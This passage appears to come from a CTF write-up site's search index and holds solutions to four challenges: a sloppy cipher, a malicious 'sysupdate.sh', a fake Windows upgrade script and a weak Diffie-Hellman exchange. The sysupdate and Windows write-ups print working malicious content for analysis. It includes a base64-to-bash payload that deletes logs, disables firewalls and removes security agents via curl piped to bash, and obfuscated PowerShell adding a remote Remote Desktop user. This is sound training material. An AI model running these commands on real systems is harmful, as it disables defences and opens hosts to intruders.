jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii \u0026#39;\u0026#39;\u0026#39; The file that created it is: \u0026#39;\u0026#39;\u0026#39; from random import randint as rint from secret_stuff import FLAG def encrypt(FLAG): return \u0026#34;\u0026#34;.join([str(ord(c))+str(rint(126, 254)) for c in FLAG]) def toBytes(enc): return \u0026#34;\u0026#34;.join([chr(int(enc[i])+100) for i in range(len(enc))]) with open(\u0026#34;./flag.enc\u0026#34;,\u0026#34;w\u0026#34;) as f: enc = encrypt(FLAG) enc_ = toBytes(enc) f.write(enc_) Text encryption process We can distinguish that the original code that encrypted the text performs the following steps:\nTakes each character of the plaintext and converts it to the corresponding ASCII number. Converts this ASCII number from integer type to string type. Adds a random number in the range [126, 254]. That is, let p be the initial number of the plaintext and r be the random number in [126, 254]. Then c = \u0026lsquo;p\u0026rsquo; + \u0026lsquo;r\u0026rsquo; = \u0026lsquo;pr\u0026rsquo; the corresponding encrypted character. The above encryption method does nothing more than insert random numbers between each character of the original text.\nAfterwards, the modified text undergoes further modification with the function toBytes(), where this function does the following:\nTakes each number of the modified text and adds 100 to it. That is, let i be the corresponding number of the i-th letter of the modified text. Then i\u0026rsquo; = i + 100. Takes the corresponding representation of this number in character. Joins the result characters into a single string and returns it. Decrypting the encrypted text process A first step for decrypting the encrypted text is to subtract 100 from each character. This is desirable because during the encryption process, the number 100 was added to each character.\n\u0026#39;\u0026#39;\u0026#39; We open the encrypted text and subtract the number 100 from each decimal representation of each character. \u0026#39;\u0026#39;\u0026#39; with open(\u0026#34;../flag.enc\u0026#34;,\u0026#34;r\u0026#34;) as f: enc = f.read() flag_enc = \u0026#34;\u0026#34;.join([str(ord(i)-100) for i in enc]) print(flag_enc) The result of the above process is as follows:\n\u0026gt; python decryptor.py\r702187616365133711791231715224295148531981082374821411215311217812125395148511801101269924050170121140112149552194815950192125143 Since we know that the flag format is FLAG{} and we know that the encryption algorithm adds random numbers between each character in the range [126, 254], we can easily distinguish some letters. Let\u0026rsquo;s look at the first 10 digits of the previous result:\n7021876163\r--\u0026gt; 70 was the first character.\rThen a three-digit random number was added between it and the 2nd character.\r--\u0026gt; 218 is the random number added between them.\rThen follows the next character of the original text.\r--\u0026gt; 76\rThen follows the next random number.\r--\u0026gt; 163\r...\rIf we take the representation of the numbers corresponding to the first 2 characters of the original text, we will see that: 1) chr(70) --\u0026gt; \u0026#39;F\u0026#39; 2) chr(76) --\u0026gt; \u0026#39;L\u0026#39; It kinda reminds us of the flag format (\u0026#39;FLAG\u0026#39;). The process is very simple for recovering the original text and can be automated. One way to do this is the following program, but everyone can create their own:\ndef getNum(start, end, flag): flag = \u0026#34;\u0026#34;.join(flag) return flag[start:end] with open(\u0026#34;../flag.enc\u0026#34;,\u0026#34;r\u0026#34;) as f: enc = f.read() flag_enc = \u0026#34;\u0026#34;.join([str(ord(i) - 100) for i in enc]) flag_dec = [] start = 0 end = 3 flag_enc = list(flag_enc) while flag_enc: enc = getNum(start, end, flag_enc) if int(enc) \u0026gt; 0xff: end = 2 continue if int(enc) \u0026lt; 126: flag_dec.append(int(enc)) flag_enc = list(flag_enc) del flag_enc[start: end] end = 3 else: del flag_enc[start: end] print(\u0026#34;\u0026#34;.join([chr(i) for i in flag_dec])) Running the script, we get the flag:\n\u0026gt; python decryptor.py\rFLAG{4_5l0ppy_3nc2yp702} ","permalink":"http://localhost:1313/ctfwriteups/sloppyencryptor/","summary":"This is a writeup for the sloppy encryptor challenge We are given an encrypted file containing unreadable text and the file used to produce it.\nThe encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii \u0026#39;\u0026#39;\u0026#39; The file that created it is: \u0026#39;\u0026#39;\u0026#39; from random import randint as rint from secret_stuff import FLAG def encrypt(FLAG): return \u0026#34;\u0026#34;.join([str(ord(c))+str(rint(126, 254)) for c in FLAG]) def toBytes(enc): return \u0026#34;\u0026#34;.join([chr(int(enc[i])+100) for i in range(len(enc))]) with open(\u0026#34;./flag.enc\u0026#34;,\u0026#34;w\u0026#34;) as f: enc = encrypt(FLAG) enc_ = toBytes(enc) f.","title":"Sloppy Encryptor - Writeup"},{"content":"In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:\necho -n \u0026#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=\u0026#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.\nLet\u0026rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:\n#!/bin/sh ulimit -n 65535 sudo reboot rm -rf /var/log/syslog chattr -iua /tmp/ chattr -iua /var/tmp/ chattr -R -i /var/spool/cron chattr -i /etc/crontab ufw disable iptables -F echo \u0026#34;Q1RGTElCe200bDFjMTB1NV81eTU3M21fdXBkNDczNX0=\u0026#34; \u0026gt; /tmp/log_rot sudo sysctl kernel.nmi_watchdog=0 echo \u0026#39;0\u0026#39; \u0026gt; /proc/sys/kernel/nmi_watchdog echo \u0026#39;kernel.nmi_watchdog=0\u0026#39; \u0026gt;\u0026gt; /etc/sysctl.conf userdel key userdel vfinder chattr -iae /root/.ssh/ chattr -iae /root/.ssh/authorized_keys rm -rf /tmp/addres* rm -rf /tmp/walle* rm -rf /tmp/keys if ps aux | grep -i \u0026#39;[a]liyun\u0026#39;; then curl hxxp://update.aegis.aliyun.com/download/uninstall.sh | bash curl hxxp://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\tpkill aliyun-service rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service rm -rf /usr/local/aegis* systemctl stop aliyun.service systemctl disable aliyun.service service bcm-agent stop yum remove bcm-agent -y apt-get remove bcm-agent -y elif ps aux | grep -i \u0026#39;[y]unjing\u0026#39;; then /usr/local/gcloud/stargate/admin/uninstall.sh This script seems to be of malicious activity as it drops other scripts and runs it, stops services and modifies existing system files. In the code, we also see another interesting base64 string echo-ed in the /tmp/log_rot file. Decoding it aswell gives us our flag: CTFLIB{m4l1c10u5_5y573m_upd4735}\n","permalink":"http://localhost:1313/ctfwriteups/sysupdate/","summary":"In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:\necho -n \u0026#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=\u0026#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.\nLet\u0026rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it.","title":"sysupdate - Writeup"},{"content":"In this test, we are given a \u0026ldquo;.cmd\u0026rdquo; script whose purpose is to upgrade the user\u0026rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let\u0026rsquo;s analyze the file to see what we can find.\nWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:\nIt downloads content from the URL https://pastebin.com/raw/XMRy2Kp4 and saves it into a PowerShell file named safe.ps1. It then executes the newly created file. Therefore, we can easily assume that the next step is to analyze what exists at the URL from the link we discovered earlier. Visiting the link, we find the following PowerShell code:\n$computername = \u0026#34;DESKTOP-5570\u0026#34; Invoke-Command -ComputerName $computername -ScriptBlock { $computer = $env:COMPUTERNAME $domain = \u0026#34;105.10.10.34\u0026#34; $user = ((\u0026#34;{22}{24}{8}{28}{33}{19}{6}{30}{20}{4}{15}{26}{5}{32}{18}{13}{12}{10}{3}{17}{9}{2}{1}{16}{23}{7}{27}{31}{29}{14}{21}{0}{11}{25}\u0026#34; -f \u0026#39;3\u0026#39;,\u0026#39;1n\u0026#39;,\u0026#39;3h\u0026#39;,\u0026#39;urc+\u0026#39;,\u0026#39;urc\u0026#39;,\u0026#39;c+urc3ll3d_7u\u0026#39;,\u0026#39;5_\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;FL\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;6s\u0026#39;,\u0026#39;3r\u0026#39;,\u0026#39;my5urc+urc7\u0026#39;,\u0026#39;rc1urc+urcp7}ur\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;d_7h15\u0026#39;,\u0026#39;urc_\u0026#39;,\u0026#39;3_\u0026#39;,\u0026#39;rc+urcngra7\u0026#39;,\u0026#39;0u_unr4urc+\u0026#39;,\u0026#39;c)\u0026#39;,\u0026#39;(ur\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39; iEx\u0026#39;,\u0026#39;ur\u0026#39;,\u0026#39;rc+urc5uurc\u0026#39;,\u0026#39;AG{C\u0026#39;,\u0026#39;crurc+u\u0026#39;,\u0026#39;Y\u0026#39;,\u0026#39;+urc5_5\u0026#39;,\u0026#39;rc+urch\u0026#39;,\u0026#39;0u\u0026#39;)).REplAcE(\u0026#39;urc\u0026#39;,[striNg][ChAR]39).REplAcE(([ChAR]51+[ChAR]54+[ChAR]115),\u0026#39;|\u0026#39;)|\u0026amp;( $VERboSePrEfeRENCE.ToSTrinG()[1,3]+\u0026#39;X\u0026#39;-JoiN\u0026#39;\u0026#39;) $group = [ADSI]\u0026#34;WinNT://$computer/Remote Desktop Users,group\u0026#34; $group.psbase.Invoke(\u0026#34;add\u0026#34;,([ADSI]\u0026#34;WinNT://$domain/$user\u0026#34;).Path) } This code appears to be attempting to add a remote user to the victim\u0026rsquo;s computer. The unusual part is the username it is trying to add, as it is not straightforward but is built using obfuscation techniques.\nWhile recovering the name may seem difficult, it is actually quite straightforward. All we need to do is copy that specific line and execute it inside a PowerShell terminal, as at the end of the command, it joins the total string, printing it to the screen.\nAnd like this, we get the flag: FLAG{C0ngra75_Y0u_unr4v3ll3d_7h3_my573ry_b3h1nd_7h15_5u5_5cr1p7}\n","permalink":"http://localhost:1313/ctfwriteups/upgradingwindows/","summary":"In this test, we are given a \u0026ldquo;.cmd\u0026rdquo; script whose purpose is to upgrade the user\u0026rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let\u0026rsquo;s analyze the file to see what we can find.\nWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution.","title":"Upgrading Windows - Writeup"},{"content":"Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.\nPcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:\nWe can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged. Moreover, all UDP packets contain only two hosts:\n192.168.1.101 192.168.1.102 Usually, to view data exchanged over a packet, we have to click on one and look at the hexdump of the packet:\nInspecting all ICMP packets won’t lead us to anything useful. UDP packets on the other hand seem like they contain what we are looking for:\nUsing the “data” in the Wireshark filter bar, we get all the packets that contain data inside the packets. And as it turns out, all packets that contain data are UDP packets:\nUntil the packet No. 67 from the previous image, all messages are in plaintext format. The messages are:\nHey Bob what\u0026rsquo;s up:) Hey Alice:), not much. What about you? Well, i was actually trying this challenge called weak legacy at the CTFLIB platform and im kinda stuck. I was hopping for some help Of course. To be honest, i haven\u0026rsquo;t really solved this myself but i got the flag from a friend. If you\u0026rsquo;d like, i can send it to you. But it would be safer for us to start encrypting our messages so that no one else gets the flag Yeah sure! DH64? Sounds fine, here you go \u0026lsquo;p\u0026rsquo;:15081801184129193989 , \u0026lsquo;g\u0026rsquo;:2, \u0026lsquo;A\u0026rsquo;:10108766542893374992 B\u0026rsquo;:3567237346515547599 . Let’s just XOR our messages with the key Then, the messages appear encrypted. But until this point, we have all the information needed to break the encryption scheme. We know:\nKey exchange algorithm: Diffie-Hellman 64-bit (DH64). p = 15081801184129193989 g = 2 A = 10108766542893374992 B = 3567237346515547599 Message encryption: XOR operation with the shared secret So, we need to find the shared secret from Diffie-Hellman based on the variables that got exchanged and then simply XOR the encrypted messages with this key.\nTo find the shared secret, we must first find either the private key a or b of Alice or Bob.\nSearching for vulnerabilities in DH64, we end up in the following stack exchange forum, which states:\nThis post can be found at:\nhttps://crypto.stackexchange.com/questions/99519/64-bit-key-size-diffie-hellman Basically, with a small key such as the one we have found, discrete logarithm problem security is lost. So it means we can compute the discrete logarithm in one of the two public keys and find a private key of either Alice or Bob. Information on how to compute the discrete logarithm in python can be found at:\nhttps://stackoverflow.com/questions/1832617/calculate-discrete-logarithm One way to solve the challenge is with the following code:\nThis script takes the p, A, g, B variables and tries to calculate either private key a or private key b. After it finds one, it calculates the shared secret and returns it. It then makes a XOR operation on the encrypted message with the key found and returns the decrypted message. Let’s see an example with the first encrypted message:\nWe first take the hex value of the encrypted message and then paste it in the c variable of the script:\nDoing the same process for each message, we end up with the following decrypted conversation:\nwhere we can spot the flag: CTFLIB{5m4ll_k3y5_n0_3ncryp710n}\n","permalink":"http://localhost:1313/ctfwriteups/weaklegacy/","summary":"Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.\nPcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:\nWe can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged.","title":"Weak Legacy - Writeup"}]